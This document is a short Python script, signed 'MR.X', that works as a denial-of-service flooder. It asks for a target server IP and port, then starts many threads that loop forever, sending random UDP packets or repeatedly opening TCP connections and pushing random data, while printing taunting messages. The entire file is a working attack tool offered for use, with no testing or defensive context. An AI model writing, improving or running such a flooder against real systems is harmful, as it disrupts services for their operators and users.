#!/usr/bin/env python3
#Code by MR.X
import random
import socket
import threading

print("-- DON'T LOOK FOR ME WHEN YOU KNOW WHO MR.X :BY- MR.X --")
ip = str(input(" SERVER IP:"))
port = int(input(" SERVER PORT:"))
choice = str(input(" READY? (Y/N):"))
times = int(input(" CONNECTION PACKAGE:"))
threads = int(input("NUMBER OF PACKAGES:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[I WILL BLOCK YOU]","[I WILL BLOCK YOU]","[I WILL BLOCK YOU]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" START HECKING!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" FUCK!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
